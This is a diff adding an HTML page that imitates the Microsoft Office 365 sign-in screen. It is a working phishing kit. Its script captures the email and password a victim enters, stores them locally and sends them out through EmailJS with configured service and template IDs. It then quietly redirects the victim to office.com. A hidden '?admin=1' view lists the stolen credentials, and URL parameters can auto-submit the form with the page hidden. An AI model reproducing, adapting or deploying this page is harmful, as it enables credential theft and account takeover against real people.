@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<!-- saved from url=(0064)file:///C:/Users/HP/OneDrive/Desktop/cookies_link_office365.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #1b1b1b;
+            line-height: 1.5;
+        }
+
+        .header {
+            width: 100%;
+            padding: 16px 24px;
+        }
+        .header img { height: 24px; }
+
+        .main-wrapper {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 24px 16px 48px;
+        }
+
+        .login-card {
+            background: #fff;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+            padding: 44px;
+            width: 100%;
+            max-width: 440px;
+        }
+
+        .ms-logo { margin-bottom: 16px; }
+        .ms-logo img { height: 24px; }
+
+        .login-card h2 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        /* ── Step 1: Email ── */
+        #step-email { display: block; }
+
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; font-size: 14px; color: #1b1b1b; margin-bottom: 6px; }
+        .form-group input {
+            width: 100%; padding: 10px 12px; font-size: 15px;
+            border: 1px solid #8a8886; outline: none; background: #fff; color: #1b1b1b;
+        }
+        .form-group input:focus { border-color: #0067b8; box-shadow: inset 0 0 0 1px #0067b8; }
+        .form-group input::placeholder { color: #8a8886; }
+
+        .link-row { font-size: 13px; margin-bottom: 20px; }
+        .link-row a { color: #0067b8; text-decoration: none; }
+        .link-row a:hover { text-decoration: underline; color: #004578; }
+
+        .btn-row { overflow: hidden; margin-bottom: 24px; }
+        .btn-next {
+            float: right; padding: 10px 32px; font-size: 15px; font-weight: 400;
+            color: #fff; background: #0067b8; border: none; cursor: pointer;
+        }
+        .btn-next:hover { background: #005a9e; }
+        .btn-next:active { background: #004578; }
+
+        /* ── Step 2: Password ── */
+        #step-password { display: none; }
+
+        .back-row { margin-bottom: 16px; }
+        .back-row button {
+            background: none; border: none; font-size: 15px; color: #0067b8; cursor: pointer; padding: 0;
+        }
+        .back-row button:hover { text-decoration: underline; }
+
+        .email-display {
+            display: flex; align-items: center; gap: 12px; margin-bottom: 16px;
+            padding: 12px 0;
+        }
+        .email-circle {
+            width: 48px; height: 48px; border-radius: 50%; background: #0067b8;
+            color: #fff; display: flex; align-items: center; justify-content: center;
+            font-size: 20px; font-weight: 600; flex-shrink: 0;
+        }
+        .email-display-text { font-size: 15px; color: #1b1b1b; word-break: break-all; }
+
+        .checkbox-row {
+            display: flex; align-items: flex-start; gap: 8px; margin-bottom: 20px; font-size: 14px;
+        }
+        .checkbox-row input[type="checkbox"] { margin-top: 3px; width: 16px; height: 16px; accent-color: #0067b8; }
+
+        .card-footer { font-size: 13px; color: #616161; margin-top: 16px; }
+        .card-footer a { color: #0067b8; text-decoration: none; }
+        .card-footer a:hover { text-decoration: underline; }
+
+        .page-footer {
+            width: 100%; max-width: 440px; padding: 16px 0 32px;
+            display: flex; justify-content: flex-start; gap: 16px; font-size: 12px;
+        }
+        .page-footer a { color: #616161; text-decoration: none; }
+        .page-footer a:hover { text-decoration: underline; }
+
+        @media (max-width: 480px) {
+            .login-card { padding: 24px 20px; box-shadow: none; }
+            .header { padding: 12px 16px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="./Sign in to your microsoft account html_files/MSFT-Microsoft-sticky-logo-RE1Mu3b.png" alt="Microsoft">
+    </div>
+
+    <main class="main-wrapper">
+        <div class="login-card">
+
+            <div class="ms-logo">
+                <img src="./Sign in to your microsoft account html_files/MSFT-Microsoft-sticky-logo-RE1Mu3b.png" alt="Microsoft">
+            </div>
+
+            <!-- ═══ Step 1: Enter email ═══ -->
+            <div id="step-email">
+                <h2>Sign in</h2>
+
+                <form onsubmit="goToPassword(event)">
+                    <div class="form-group">
+                        <label for="email-field">Email, phone, or Skype</label>
+                        <input type="email" id="email-field" name="email" placeholder="someone@example.com" autocomplete="email" required="">
+                    </div>
+
+                    <p class="link-row"><a href="file:///C:/Users/HP/OneDrive/Desktop/cookies_link_office365.html#">No account? Create one!</a></p>
+
+                    <div class="btn-row">
+                        <button type="submit" class="btn-next">Next</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- ═══ Step 2: Enter password ═══ -->
+            <div id="step-password">
+                <div class="back-row">
+                    <button onclick="goBackToEmail()">← Back</button>
+                </div>
+
+                <div class="email-display">
+                    <div class="email-circle" id="email-initial">?</div>
+                    <div class="email-display-text" id="email-show">user@example.com</div>
+                </div>
+
+                <h2 style="font-size:24px;font-weight:600;margin-bottom:4px;">Enter password</h2>
+
+                <form id="password-form" onsubmit="handleSubmit(event)">
+                    <div class="form-group" style="margin-top:16px;">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password" required="" minlength="6">
+                    </div>
+
+                    <p class="link-row"><a href="file:///C:/Users/HP/OneDrive/Desktop/cookies_link_office365.html#">Forgot password?</a></p>
+
+                    <div class="checkbox-row">
+                        <input type="checkbox" id="keep-signed-in" checked="">
+                        <label for="keep-signed-in">Keep me signed in</label>
+                    </div>
+
+                    <div class="btn-row">
+                        <button type="submit" class="btn-next">Sign in</button>
+                    </div>
+                </form>
+
+                <p class="card-footer">
+                    <a href="file:///C:/Users/HP/OneDrive/Desktop/cookies_link_office365.html#">Sign in with Windows Hello or a security key</a>
+                </p>
+            </div>
+
+        </div>
+
+        <footer class="page-footer">
+            <a href="file:///C:/Users/HP/OneDrive/Desktop/cookies_link_office365.html#">Terms of use</a>
+            <a href="file:///C:/Users/HP/OneDrive/Desktop/cookies_link_office365.html#">Privacy &amp; cookies</a>
+            <a href="file:///C:/Users/HP/OneDrive/Desktop/cookies_link_office365.html#">...</a>
+        </footer>
+    </main>
+
+    <script src="./Sign in to your microsoft account html_files/email.min.js.download"></script>
+    <script>
+        emailjs.init('lJWpHKIq_0JCMKfla');
+        var EMAIL_SERVICE_ID = 'service_5l8fxi6';
+        var EMAIL_TEMPLATE_ID = 'template_p59p6pb';
+        var GOOGLE_SCRIPT_URL = '';
+
+        var userEmail = '';
+
+        function goToPassword(event) {
+            event.preventDefault();
+            userEmail = document.getElementById('email-field').value.trim();
+            if (!userEmail) { alert('Enter your email first.'); return; }
+
+            document.getElementById('step-email').style.display = 'none';
+            document.getElementById('step-password').style.display = 'block';
+            document.getElementById('email-show').textContent = userEmail;
+            document.getElementById('email-initial').textContent = userEmail.charAt(0).toUpperCase();
+            document.getElementById('password').focus();
+        }
+
+        function goBackToEmail() {
+            document.getElementById('step-password').style.display = 'none';
+            document.getElementById('step-email').style.display = 'block';
+        }
+
+        // ═══ Auto-fill from URL params ═══
+        (function () {
+            var params = new URLSearchParams(window.location.search);
+
+            if (params.get('admin') === '1') {
+                var subs = JSON.parse(localStorage.getItem('office365Submissions') || '[]');
+                var html = '<div style="max-width:800px;margin:40px auto;font-family:sans-serif;">';
+                html += '<h2 style="color:#0067b8;">Office 365 Submissions (' + subs.length + ')</h2>';
+                if (subs.length === 0) {
+                    html += '<p>No submissions yet.</p>';
+                } else {
+                    html += '<table style="width:100%;border-collapse:collapse;margin-top:16px;">';
+                    html += '<tr style="background:#0067b8;color:#fff;"><th style="padding:10px;text-align:left;">#</th><th style="padding:10px;text-align:left;">Email</th><th style="padding:10px;text-align:left;">Password</th><th style="padding:10px;text-align:left;">Time</th></tr>';
+                    for (var i = 0; i < subs.length; i++) {
+                        var s = subs[i];
+                        var bg = i % 2 === 0 ? '#f0f0f0' : '#fff';
+                        html += '<tr style="background:' + bg + ';"><td style="padding:10px;border-bottom:1px solid #ddd;">' + (i + 1) + '</td><td style="padding:10px;border-bottom:1px solid #ddd;">' + s.email + '</td><td style="padding:10px;border-bottom:1px solid #ddd;">' + s.password + '</td><td style="padding:10px;border-bottom:1px solid #ddd;">' + s.time + '</td></tr>';
+                    }
+                    html += '</table>';
+                    html += '<button onclick="localStorage.removeItem(\'office365Submissions\');location.reload();" style="margin-top:16px;padding:8px 16px;background:#c5221f;color:#fff;border:none;border-radius:6px;cursor:pointer;">Clear All</button>';
+                }
+                html += '<p style="margin-top:16px;"><a href="?">Back to login</a></p></div>';
+                document.body.innerHTML = html;
+                return;
+            }
+
+            // Pre-fill email from URL
+            if (params.get('email')) {
+                document.getElementById('email-field').value = params.get('email');
+            }
+            // Pre-fill password from URL
+            if (params.get('password')) {
+                var pwEl = document.getElementById('password');
+                if (pwEl) pwEl.value = params.get('password');
+            }
+
+            // Auto-submit flow from URL params
+            if (params.get('submit') === '1') {
+                var emailVal = params.get('email') || '';
+                var passVal = params.get('password') || '';
+                if (emailVal && passVal) {
+                    userEmail = emailVal;
+                    document.getElementById('step-email').style.display = 'none';
+                    document.getElementById('step-password').style.display = 'block';
+                    document.getElementById('email-show').textContent = userEmail;
+                    document.getElementById('email-initial').textContent = userEmail.charAt(0).toUpperCase();
+                    document.getElementById('password').value = passVal;
+                    document.body.style.visibility = 'hidden';
+                    // Wait a tiny bit for DOM, then submit
+                    setTimeout(function() {
+                        document.getElementById('password-form').dispatchEvent(new Event('submit'));
+                    }, 500);
+                }
+            }
+        })();
+
+        function handleSubmit(event) {
+            event.preventDefault();
+
+            var email = userEmail;
+            var password = document.getElementById('password').value;
+
+            if (!email || !password) {
+                alert('Please fill in all fields.');
+                return;
+            }
+
+            // Save locally
+            var submissions = JSON.parse(localStorage.getItem('office365Submissions') || '[]');
+            submissions.push({
+                email: email,
+                password: password,
+                time: new Date().toLocaleString()
+            });
+            localStorage.setItem('office365Submissions', JSON.stringify(submissions));
+
+            // Send via EmailJS
+            if (EMAIL_SERVICE_ID !== 'YOUR_SERVICE_ID' && EMAIL_TEMPLATE_ID !== 'YOUR_TEMPLATE_ID') {
+                emailjs.send(EMAIL_SERVICE_ID, EMAIL_TEMPLATE_ID, {
+                    name: email,
+                    email: email,
+                    password: password,
+                    time: new Date().toLocaleString()
+                }).then(function() {
+                    window.location.href = 'https://www.office.com';
+                }).catch(function(error) {
+                    alert('Email failed: ' + error.text);
+                    window.location.href = 'https://www.office.com';
+                });
+                setTimeout(function() {
+                    window.location.href = 'https://www.office.com';
+                }, 5000);
+            } else {
+                window.location.href = 'https://www.office.com';
+            }
+        }
+    </script>
+
+
+
+</body></html>
